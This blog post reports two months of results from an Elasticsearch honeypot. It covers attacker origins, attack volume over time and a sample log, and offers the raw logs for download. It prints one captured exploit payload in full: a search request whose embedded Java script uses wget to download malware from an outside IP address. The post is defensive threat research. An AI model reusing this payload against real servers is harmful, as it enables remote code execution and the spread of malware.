---
layout: post
title: "60 Days of Watching Hackers Attack Elasticsearch"
date: 2015-05-11 20:00:00
comments: true
published: true
categories:
- elastichoney
- elasticsearch
- honeypot
---
<img src="{{root_url}}/images/headers/elk_results.png"/>
### Introduction
Two months ago, one of my DigitalOcean instances started attacking another host with massive amounts of bogus traffic. I was notified by the abuse team at DO that my VPS was participating in a DDoS attack. I managed to track down that the attackers leveraged an [RCE vulnerability in Elasticsearch](/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/) to automatically download and run malware.

After re-building the box from scratch (with many improvements!), I [created a honeypot](/blog/2015/03/23/introducing-elastichoney-an-elasticsearch-honeypot/) called Elastichoney to measure how much this vulnerability is being exploited in the wild. Since then, I've had multiple sensors silently logging all attempts to exploit this vulnerability.

Here are the results.
<!--more-->
### Who's Attacking Me?

[Elastichoney](https://github.com/jordan-wright/elastichoney) keeps track of quite a bit of data, including the source IP and payload sent to the sensor. I logged every attack to an Elasticsearch instance (have some irony - free of charge!) and enriched the data with geoip information using Logstash. Finally, I created a slick dashboard using Kibana to view the results.

So far, I've had around 8k attempts to attack the honeypots from over 300 unique IP addresses. One of the immediate things I noticed was thing a vast majority (over 93%) of attacks were coming from Chinese IP addresses:

<img src="{{root_url}}/images/blog/elastichoney_elk/map.png"/>

The second thing that I noticed was how fast the majority of exploit attempts died down. Here's a histogram of attack attempts since the sensors have been running:

<img src="{{root_url}}/images/blog/elastichoney_elk/histogram.png"/>

You'll notice a spike between March 20<sup>th</sup> and April 11<sup>th</sup>. These attacks came from a few Chinese IP addresses that all stopped their attacks at the same time. But hey, attacks come in, attacks go out. [You can't explain that.](http://cdn.meme.am/instances/500x/58834359.jpg)

### What are the Attackers Doing?
I mentioned that Elastichoney logs the payload sent to the sensor. In some cases, these were attempts to run boring commands like ```whoami```, etc. However, in quite a few cases, the malware attempted to use ```wget``` to download and run malware - similar to what happened to my DO instance.

These looked something like this:

```
source={"query":+{"filtered":+{"query":+{"match_all":+{}}}},+"script_fields":+{"exp":+{"script":+"import+java.util.*;import+java.io.*;String+str+=+\"\";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\"wget+-O+/tmp/zuosyn+http://115.28.216.181:995/zuosyn\").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);sb.append(\"\r\n\");}sb.toString();"}},+"size":+1}
```

These malware samples were generally nothing more than basic bots. They could be compiled ELF binaries, or simple Perl scripts. While we're working to let Elastichoney automatically download these malware samples, for now the data is in the logs. Speaking of logs...

### The Raw Data
I'm a fan of open-sourcing as much information as possible if it helps the community. As such, I've decided to release all the logs I currently have.

You can download the raw JSON logs [here](/downloads/elastichoney_logs.json.gz). Here's an example log to show how the logs are structured:

``` json
{
    "source": "222.186.56.46",
    "@timestamp": "2015-05-10T15:44:56.803Z",
    "url": "x.x.x.x:9200/_search?",
    "method": "GET",
    "form": "form_payload",
    "payload": "json_payload",
    "headers": {
        "user_agent": "python-requests/2.4.1 CPython/2.7.8 Windows/2003Server",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x",
    "@version": "1",
    "host": "127.0.0.1:39642",
    "name": "Python Requests",
    "os": "Windows",
    "os_name": "Windows",
    "device": "Other",
    "major": "2",
    "minor": "4",
    "geoip": {
        "ip": "222.186.56.46",
        "country_code2": "CN",
        "country_code3": "CHN",
        "country_name": "China",
        "continent_code": "AS",
        "region_name": "04",
        "city_name": "Nanjing",
        "latitude": 32.0617,
        "longitude": 118.77780000000001,
        "timezone": "Asia/Shanghai",
        "real_region_name": "Jiangsu",
        "location": [118.77780000000001, 32.0617]
    }
}
```
As always, let me know if you have any questions or comments below!

Enjoy!

-Jordan ([@jw_sec](https://twitter.com/jw_sec))
